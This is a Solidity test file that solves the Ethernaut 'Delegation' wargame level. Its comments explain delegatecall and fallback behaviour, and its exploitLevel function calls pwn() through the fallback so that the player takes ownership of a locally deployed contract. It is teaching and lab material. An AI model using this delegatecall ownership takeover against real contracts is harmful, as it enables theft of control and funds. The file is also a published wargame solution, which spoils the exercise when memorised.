// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Call and Delegate calls are powerful tools to use but they come with great responsabiities
        // and security concerns. You always need to know what you are doing and which are the conseguences.
        // You can find more info about delegatecall here
        // - https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries
        // - https://solidity-by-example.org/delegatecall
        //
        // Delegate call works like this: the code at the target address is executed in the context (i.e. at the address) of the calling
        // contract and msg.sender and msg.value do not change their values. This means that a contract can dynamically load code from a
        // different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.

        // Delegation contract expose a fallback function. A fallaback function is a function that get called when:
        // 1) you send money to a contract that is not implementing the `receive` function
        // 2) you are calling a function that does not exist on the contract
        // In the fallabck function of Delegation it make a `delegatecall` on the `Delegate` contract passing the whole `msg.data`
        // When you execute a delegatecall from contract A to contract B you are executing the `B` function but with the `A` context (storage, msg.sender, and so on)
        // This means that when we execute the `pwn` function on `Delegate` it will modify the storage of the `Delegation` contract!
        // Because of this we are able to become the new `owner` of the Delegation` contract.

        (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");

        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}
